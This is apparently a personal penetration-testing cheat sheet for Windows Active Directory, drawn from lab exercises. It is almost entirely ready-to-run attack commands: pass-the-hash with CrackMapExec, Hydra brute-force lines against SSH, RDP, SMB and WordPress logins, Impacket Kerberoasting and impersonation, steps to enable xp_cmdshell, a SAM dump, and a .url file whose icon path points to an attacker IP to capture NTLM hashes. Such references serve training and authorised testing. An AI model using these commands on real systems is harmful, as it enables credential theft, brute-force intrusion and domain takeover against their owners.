 #  Window Active Directory Pentesting
 # Crackmapexec
 
## With Password
```bash
crackmapexec smb $ip -u '' -p '' --$Flags
```

## Pass the hashes
```
crackmapexec smb $ip -u '' -H '' --$Flags
```
## JohnHammond CME to Self Hosted AD DC
https://www.youtube.com/watch?v=WPnFnPkOWIg&list=PL1H1sBF1VAKVoU6Q2u7BBGPsnkn-rajlp&index=6

## More
```bash
https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/
```

# Smbclient

## Enumerate shares
```bash
smbclient -L \\$ip\Share -U ''
```
## Enumerate more with Known Username and password 
```bash
smbclient \\$ip\$share_name -U '' -P ''
```


# BloodHound
Installation: https://www.youtube.com/watch?v=yp8fw72oQvY&list=PL1H1sBF1VAKVoU6Q2u7BBGPsnkn-rajlp&index=7

# Evil Winrm
```bash
evil-winrm -i $ip -u '' -p ''
```
____________________________________________________________________________________________________________________________________________________________________________
# Hydra
### BruteForce with username and password
```bash
hydra -l '' -p '' ssh://$ip or ftp://$ip
```
### Http post form
```bash
hydra -l '' -p '' http://$ip_Or_domain/ http-post-form ":/"
```
### Others
| Command | Description |
|-------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------|
| hydra -P password-file.txt -v $ip snmp                                                                                                    | Hydra brute force against SNMP                       |
| hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp                                                                       | Hydra FTP known user and rockyou password list       |
| hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh                                                                              | Hydra SSH using list of users and passwords          |
| hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh                                                                         | Hydra SSH using a known password and a username list |
| hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt                                                                                         | Hydra SSH Against Known username on port 22          |
| hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V                                                                          | Hydra POP3 Brute Force                               |
| hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V                                                                                         | Hydra SMTP Brute Force                               |
| hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin                                                                                 | Hydra attack http get 401 login with a dictionary    |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip                                                           | Hydra attack Windows Remote Desktop with rockyou     |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb                                                             | Hydra brute force SMB user with rockyou:             |
| hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' | Hydra brute force a Wordpress admin login            |
| hydra -L usernames.txt -P passwords.txt $ip smb -V -f | SMB Brute Forcing |
| hydra -L users.txt -P passwords.txt $ip ldap2 -V -f | LDAP Brute Forcing |

# Redis
```bash
https://developer.redis.com/howtos/quick-start/cheat-sheet/
```

# Impacket

## Impacket-lookupsid
```bash
impacket-lookupsid domain/guest@$ip
```
## Impacket-GetNPUsers
```
impacket-GetNPUsers vulnet-rst.local/ -no-pass -userfile users.txt
```
## Impacket-psexec
```
impacket-psexec vulnnet-rst.local/a-whitehat@10.10.216.107
```
## Impacket-GetUserSPNs
```
impacket-GetUserSPNs vulnnet-rst.local/$username:$password -dc-ip $ip -request
```
## Impacket-getST
```
impacket-getST -k -impersonate Administrator -spn cifs/HayStack.thm.corp thm.corp/DARLA_WINTERS
```
## Impacket-mssqlclient
```
SQL (ARCHETYPE\sql_svc  dbo@master)> select is_srvrolemember('sysadmin');
```
#### Configure if xp_cmdshell is not activated
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```


# Kerbrute
```
kerbrute -users Username_wordlist.txt -domain vulnnet-rst.local -dc-ip $ip
```
# Rpcclient
```
rpcclient -U '' $ip

$> enumdomshares  # Enumerate shares

$> enumdomusers   # List users
$> enumdomgroups  # List groups

$> querydispinfo    # List sessions
$> querydispinfo2

$> enumdomctrl    # List domain controllers

$> enumtrust    # List trust relationships

$> queryuser    # List domain policy information
$> querygroup

$> enumprinters    # List printer information

$> lookupnames    # Get user and group information
$> lookupaliases

$> samdump    # Dump SAM database

$> rpcclient -c enumprivs <target>    # List RPC services

```
# Ldapsearch
```
ldapsearch -x -h $ip -b base namingcontext
```
# NTLM_Thief
```
┌──(ryan㉿kali)-[~/THM/Reset]
└─$ cat >> shell.url
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.6.61.45\%USERNAME%.icon
IconIndex=1
```

# Force_Change_Password 
```
net rpc password "$username_of_forced" "$desired_password" -u "thm.corp"/"$privileged_username"%"$password" -S "$IP"           

```

# AWS
```
aws --endpoint=http://domain.brnyr/ s3 ls
aws --endpoint=http://domain.brnyr/ s3 ls s3://domain.brnyr
aws  --endpoint=http://domain.brnyr/ s3 cp afile_toupload.php s3://domain.brnyr
```

# Rubeus
```
.\Rubeus.exe asproast /usr:johnny /outfile:johnny_asproasted_hash.txt
```


